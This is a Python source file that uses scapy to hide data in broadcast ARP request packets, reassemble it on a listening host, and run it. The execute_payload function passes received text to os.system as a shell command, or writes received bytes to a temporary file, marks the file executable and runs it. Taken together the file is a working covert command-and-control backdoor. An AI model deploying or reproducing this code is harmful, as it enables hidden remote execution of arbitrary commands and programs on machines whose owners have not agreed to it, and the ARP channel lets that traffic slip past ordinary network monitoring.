import logging
import time
import os
import stat
import tempfile
from scapy.all import Ether, ARP, sendp, sniff, Raw

COVERT_MAGIC_VALUE = b'\xDE\xAD\xBE\xEF'
CHUNK_SIZE = 42  # Increased chunk size for better performance

def send_arp_payload(target_ip, payload, payload_type="RAW"):
    """
    Sends a payload to a target IP using a covert channel in ARP packets.
    The payload is broken into sequenced chunks for reliable reassembly.
    """
    if isinstance(payload, str):
        payload = payload.encode()

    logging.info(f"Preparing to send a {payload_type} payload of {len(payload)} bytes to {target_ip}.")

    # Send a "start" packet with metadata
    start_payload = b'START' + len(payload).to_bytes(4, 'big') + payload_type.encode()
    try:
        start_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_ip, psrc='0.0.0.0', op='who-has')
        start_packet.add_payload(COVERT_MAGIC_VALUE + start_payload)
        sendp(start_packet, verbose=False)

        time.sleep(0.1)

        # Send the payload in sequenced chunks
        for i in range(0, len(payload), CHUNK_SIZE):
            chunk_num = (i // CHUNK_SIZE).to_bytes(4, 'big')
            chunk = payload[i:i+CHUNK_SIZE]
            packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_ip, psrc='0.0.0.0', op='who-has')
            packet.add_payload(COVERT_MAGIC_VALUE + chunk_num + chunk)
            sendp(packet, verbose=False)
            time.sleep(0.05)

        # Send an "end" packet
        end_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_ip, psrc='0.0.0.0', op='who-has')
        end_packet.add_payload(COVERT_MAGIC_VALUE + b'END')
        sendp(end_packet, verbose=False)
    except PermissionError:
        logging.error("Permission denied. This operation requires root privileges.")
        print("Error: Permission denied. You need to run this tool as root to send ARP packets.")

    logging.info("Payload transmission complete.")

def listen_for_payload(timeout=60):
    """
    Listens for a covert payload, reassembles it, and returns the data and type.
    """
    logging.info("Starting ARP payload listener...")

    chunks = {}
    expected_size = -1
    payload_type = "RAW"

    def packet_handler(packet):
        nonlocal expected_size, payload_type, chunks

        if ARP in packet and packet[ARP].op == 1 and packet.haslayer(Raw):
            raw_data = packet[Raw].load
            if raw_data.startswith(COVERT_MAGIC_VALUE):
                data = raw_data[len(COVERT_MAGIC_VALUE):]

                if data.startswith(b'START'):
                    expected_size = int.from_bytes(data[5:9], 'big')
                    payload_type = data[9:].decode()
                    logging.info(f"Receiving a {payload_type} payload of {expected_size} bytes.")
                elif data.startswith(b'END'):
                    logging.info("End of transmission received.")
                    return True  # Stop sniffing
                else:
                    chunk_num = int.from_bytes(data[:4], 'big')
                    chunks[chunk_num] = data[4:]
                    logging.info(f"Received chunk {chunk_num + 1}/{ -(-expected_size // CHUNK_SIZE) }")
        return False

    sniff(filter="arp", prn=packet_handler, stop_filter=packet_handler, timeout=timeout)

    if not chunks or expected_size == -1:
        logging.error("No valid payload received.")
        return None, None

    # Reassemble the payload in the correct order
    sorted_chunks = [chunks[i] for i in sorted(chunks.keys())]
    payload_data = b"".join(sorted_chunks)

    if len(payload_data) == expected_size:
        logging.info("Payload reassembled successfully.")
        return payload_data, payload_type
    else:
        logging.error(f"Failed to reassemble payload. Expected {expected_size} bytes, got {len(payload_data)}.")
        return None, None

def execute_payload(payload, payload_type):
    """
    Executes a received payload based on its type.
    """
    if not payload:
        return

    if payload_type == "SHELL_COMMAND":
        try:
            command = payload.decode()
            logging.info(f"Executing shell command: {command}")
            os.system(command)
        except Exception as e:
            logging.error(f"Failed to execute command: {e}")
    elif payload_type == "EXECUTABLE":
        try:
            with tempfile.NamedTemporaryFile(delete=False) as tmp:
                tmp.write(payload)
                tmp_filename = tmp.name

            st = os.stat(tmp_filename)
            os.chmod(tmp_filename, st.st_mode | stat.S_IEXEC)

            logging.info(f"Executing file: {tmp_filename}")
            os.system(tmp_filename)
        except Exception as e:
            logging.error(f"Failed to execute file: {e}")
        finally:
            if 'tmp_filename' in locals() and os.path.exists(tmp_filename):
                os.remove(tmp_filename)
    else:
        logging.warning(f"Received RAW payload. Not executing:\n{payload}")
